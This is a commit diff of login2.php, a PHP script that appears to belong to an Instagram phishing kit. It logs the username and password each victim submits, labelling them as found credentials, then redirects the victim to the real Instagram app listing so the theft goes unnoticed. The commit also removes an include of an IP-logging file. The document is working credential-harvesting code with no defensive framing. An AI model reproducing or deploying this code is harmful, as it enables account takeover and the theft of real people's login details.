01864e91db8340de83b2a637bf55bcd11a2149e7
rekcahkumar <48340011+rekcahkumar@users.noreply.github.com>
2021-04-14 18:03:09 +0530

    Add files via upload

--- login2.php
+++ login2.php
@@ -1,9 +1,7 @@
 <?php
-include 'ip.php';
 error_log("-----------------------------------------------------------------------");
-error_log("Instagram Credentials found");
-error_log("[EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . ");
+error_log("id&pass found");
+error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
 error_log("-----------------------------------------------------------------------");
-header('Location:/index2.html');
+header('Location: https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=2E6A1490-9BF7-4775-BA25-484C2546A5E8&utm_content=lo&utm_medium=badge');
 exit();
-
